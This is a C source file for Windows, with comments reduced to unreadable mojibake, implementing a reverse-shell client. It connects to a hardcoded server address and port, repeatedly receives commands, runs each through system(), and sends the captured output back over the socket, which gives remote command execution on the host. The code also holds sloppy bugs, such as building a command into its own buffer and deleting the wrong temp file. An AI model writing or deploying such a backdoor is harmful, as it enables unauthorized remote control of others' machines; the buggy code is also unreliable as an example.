
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib,"WS2_32.lib")


int main(int argc, char* argv[])
{
	WSADATA wsaData;
	SOCKET s;
	SOCKADDR_IN servAddr;
	char szCmd[64];        //����ָ�����
	char szBuff[1024*8];   //������Ϣ������
	int nSend, nRecv;
	char szTmpFile[256];
	HANDLE hFile;
	DWORD dwRead;
	
	//��ʼ��WS2_32.dll
	WORD sockVersion = MAKEWORD(2, 0);
	WSAStartup(sockVersion, &wsaData);
	
	//�����׽���
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		printf("Failed socket() \n");
		WSACleanup();
		return 0;
	}
	
	//Ҳ�������������bind������һ�����ص�ַ������ϵͳ�����Զ�����
	
	//��дԶ�̵�ַ��Ϣ
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(8888);
	servAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");   //��д�������˵�IP��ַ
	
	if(connect(s, (PSOCKADDR_IN)&servAddr, sizeof(servAddr)) == -1)
	{
		printf("Failed connect() \n");
		WSACleanup();
		return 0;
	}
	
	//ѭ���������Է������˵Ŀ���ָ��
	while(1)
	{
		memset(szCmd, 0, sizeof(szCmd));
		memset(szBuff, 0, sizeof(szBuff));
		
		//���տ���ָ��
		nRecv = recv(s, szCmd, sizeof(szCmd), 0);
		if(nRecv > 0)
		{
			szCmd[nRecv] = '\0';
		}
		printf("Execute Command: %s\n", szCmd);
		
		//ִ��������������ض�����ʱ�ļ�
		GetTempPath(sizeof(szTmpFile), szTmpFile);
		strcat(szTmpFile, "\cmd.tmp");
		sprintf(szCmd, "%s >%s", szCmd, szTmpFile);
		system(szCmd);
		
		memset(szBuff, 0, sizeof(szBuff));
		hFile = CreateFile(szTmpFile, GENERIC_READ|GENERIC_WRITE, 
		                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
		                     OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile == INVALID_HANDLE_VALUE)
		{
			MessageBox(NULL, "Temp file can not open", "Error", MB_OK);
		}
		ReadFile(hFile, &szBuff, sizeof(szBuff), &dwRead, NULL);
		
		//�ѷ�����Ϣ���͵���������
		nSend = send(s, szBuff, sizeof(szBuff), 0);
		if(nSend == SOCKET_ERROR)
		{
			MessageBox(NULL, "Server has been shut down", "Error", MB_OK);
			break;
		}
		
		//������ʱ�ļ�
		CloseHandle(hFile);
		DeleteFile("C:\\temp.txt");
	}
	
	//�ر��׽���
	closesocket(s);
	//�ͷ�WS2_32��
	WSACleanup();
	
	return 0;
}